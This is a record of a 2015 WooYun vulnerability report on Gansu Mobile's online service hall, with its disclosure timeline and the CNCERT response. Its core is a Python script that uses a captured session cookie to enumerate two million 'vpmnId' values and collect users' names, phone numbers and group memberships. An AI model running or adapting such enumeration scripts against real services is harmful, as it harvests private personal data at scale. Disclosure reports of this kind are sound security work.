{"id": 65746, "wybug_id": "wooyun-2015-0135806", "wybug_title": "甘肃移动网上营业厅某业务参数控制不严格可遍历百万用户信息", "wybug_corp": "甘肃移动", "wybug_author": "路人甲", "wybug_date": "2015-08-23 11:23", "wybug_open_date": "2015-10-10 08:32", "wybug_type": "账户体系控制不严", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向公众公开  简要描述： 甘肃移动网上营业厅我的V网业务，由于用户参数控制不严格，可遍历百万用户信息。 详细说明：  甘肃移动我的V网业务\n\n抓包，发现有一个参数可控，如下图\n\n   漏洞证明：  甘肃移动我的V网业务\n\n抓包，发现有一个参数可控，如下图\n\n可编写脚本对参数进行遍历，获取用户姓名对应的电话号码以及群组关系\n#coding=utf-8import sysreload(sys)sys.setdefaultencoding(\"utf-8\")import urllib2import urllibimport jsonimport timeimport socketurllib2.socket.setdefaulttimeout=20#打印提交及返回的数据包def DebugData():      httpHandler = urllib2.HTTPHandler(debuglevel=1)      httpsHandler = urllib2.HTTPSHandler(debuglevel=1)      opener = urllib2.build_opener(httpHandler, httpsHandler)      urllib2.install_opener(opener)#数据包构造def PostData(number):      DebugData()      value={\"jsonParam\":json.dumps([{\"dynamicParameter\":{\"method\":\"queryVMemInfo\",\"handleNum\":\"defaultHandle\",\"applyNum\":\"myIndexBusiTransCDS\",\"vpmnId\":number},\"dynamicDataNodeName\":\"loginCallBackActionNode\"}])}      data=urllib.urlencode(value)      req=urllib2.Request(\"http://www.gs.10086.cn/service/businessDeal.do\",data)      req.add_header(\"User-Agent\",\"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36\")      cookie='''JSESSIONID=2BB5CAF7F90C9836F881ABC11B9EC2F6; SSOCookie=\"4C49AB43AF0542758D60A32803510DB9@gs.ac.10086.cn\";   CmLocation=931|931; CmProvid=gs'''      req.add_header(\"Cookie\",cookie)      req.add_header(\"Accept\",\"text/plain\")      req.add_header(\"X-Requested-With\",\"XMLHttpRequest\")      req.add_header(\"Referer\",\"http://www.gs.10086.cn/service/my/myindex.html\")      response=urllib2.urlopen(req,timeout=10)      print response.read().decode(\"utf-8\").encode(\"gbk\")      for number in range(2007000000,2009000000):      PostData(number)\n运行截图如下\n\n   修复方案：  对用户查询参数做限制   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-26 08:31 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国移动集团公司通报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-15 12:56 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:30        | Wow~~~哈哈~~~)\t\t \n  洞主，你暴露了    \n     2015-09-16 22:29 |    \t\tstrong \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:5        | 一起学习，一起成长)\t\t \n  @小红猪 我能告诉你，那个电话号码是我搞的别人的吗    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}